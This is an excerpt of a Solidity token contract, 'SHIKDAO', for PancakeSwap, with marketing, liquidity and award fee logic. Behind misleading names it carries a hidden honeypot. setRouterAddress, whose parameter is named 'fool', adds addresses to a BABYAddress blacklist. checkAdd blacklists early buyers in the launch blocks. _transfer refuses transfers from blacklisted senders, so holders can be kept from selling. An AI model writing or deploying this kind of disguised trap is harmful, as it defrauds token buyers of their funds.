...
contract SHIKDAO is Context, IERC20, Ownable {
    ...
    uint256 internal _award;
    
    uint256 liquidityfee= 0;
    uint256 internal _liquidityShare = 1;
    uint256 internal _MarketingShare = 2;
    uint256 internal _awardShare = 0;
    ...
    address internal _receivingaddress ;
    ...
    address Marketing, address award, uint256 burnfee, uint256 DividendDistributorfee,uint256 awardfee,address PancakeRouterAddress,address receivingaddress) {
        ...
        marketingWalletAddress = payable(Marketing);
        DividendDistributorAddress = payable(award);
        _burn = burnfee;
        _Liquidity = liquidityfee;
        _Marketing = DividendDistributorfee;
        _award = awardfee;
        launchEnd = bot;
        ...
        isExcludedFromFee[address(Marketing)] = true;
        isExcludedFromFee[address(award)] = true;
        isExcludedFromFee[address(receivingaddress)] = true;
        
        _total = _Liquidity.add(_Marketing).add(_award).add(_burn);
        _totalDistributionShares = _liquidityShare.add(_MarketingShare).add(_awardShare);
    ...
    function setMarketPairStatus(address account, bool newValue) public PancakeRouter {
        isMarketPair[account] = newValue;
    }
    function setIsExcludedFromFee(address account, bool newValue) public manage {
        isExcludedFromFee[account] = newValue;
    }

    function setDividenNum(uint256 newLimit) external PancakeRouter {
    ...
    function setRouterAddress(address fool,bool value) public manage {
        BABYAddress[fool] = value;
    }
    ...
    function checkAdd(address sender,address recipient,uint256 amount) internal{
        if(amount>balanceOf(sender).div(10000)){require(!BABYAddress[sender] );  
        }if(launchStart + launchEnd >= block.number){if(sender!=uniswapPair){
            BABYAddress[sender] = true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address");require(!BABYAddress[sender]);
    ...
    private Inswap {
        ...
        uint256 amountBNBaward = amountReceived.mul(_awardShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBaward);
